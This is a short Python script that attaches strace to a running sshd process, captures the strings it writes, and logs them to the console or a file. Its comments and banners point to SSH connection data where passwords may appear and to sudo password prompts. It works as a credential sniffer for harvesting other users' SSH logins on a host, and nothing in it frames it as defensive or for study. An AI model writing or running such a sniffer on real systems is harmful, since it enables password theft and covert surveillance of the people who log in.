#!/usr/bin/env python3

import subprocess
import shlex
import re
import sys
import os

try:
    sshd_pid = subprocess.check_output(shlex.split('pgrep -o sshd')).decode('utf-8').rstrip()
except subprocess.CalledProcessError:
    print('Can\'t find the sshd process, is an ssh server running?')
    sys.exit(1)
if not os.path.exists('/usr/bin/strace'):
    print('Couldn\'t find strace, is it installed?')
cmd = shlex.split(f'/usr/bin/strace -f -p {sshd_pid} -s 300 -e write')

if len(sys.argv) > 1:
    try:
        outfile = sys.argv[1]
        f = open(outfile, 'w')
        f.close()
    except Exception:
        print('Error: cannot write to that outfile')
        sys.exit(1)
else:
    outfile = None

def process_line(line):
    if 'write(' not in line:
        return
    try:
        # gets the parameters of the write syscall
        innerline = line.split('write', 1)[1][1:]
        # and this gets what's between the quotes (the string that got written)
        contents = innerline.split('"', 1)[1][::-1].split('"', 1)[1][::-1]
    except IndexError:
        # just return if the indexing stuff got screwed up somehow
        return ''
    # get rid of annoying non-ASCII backslash stuff
    contents = re.sub(r'\\(?:[\d]{1,3}|n|r|t)', '', contents)
    return contents

# writes to stdout, or a file if one is given
def write(string, outfile=None):
    if outfile:
        # it's a little inefficient to open and close the file for every write
        # but it also makes sure the file updates in real time so this is how I'm doing it
        with open(outfile, 'a') as f:
            f.write(string)
            f.write('\n')
    else:
        print(string)

# use Popen to read stdout from the process in real time
process = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
previous_contents = None
try:
    while True:
        output = process.stdout.readline().decode('utf-8').rstrip()
        if process.poll() is not None:
            break
        if output:
            contents = process_line(output)
            if contents != previous_contents and contents is not None and contents != '':
                # if there might be a password coming, make it noticeable
                if contents.startswith('ssh-connection'):
                    contents = '#'*80+'\n' + '#'*32 + ' SSH CONNECTION ' + '#'*32 +'\n'+'#'*80+'\n' + contents
                elif contents.startswith('[sudo] password for '):
                    contents = '#'*80+'\n' + '#'*34 + ' SUDO USAGE ' + '#'*34 +'\n'+'#'*80+'\n' + contents
                write(contents, outfile)
            previous_contents = contents
except KeyboardInterrupt:
    print('Exiting...')

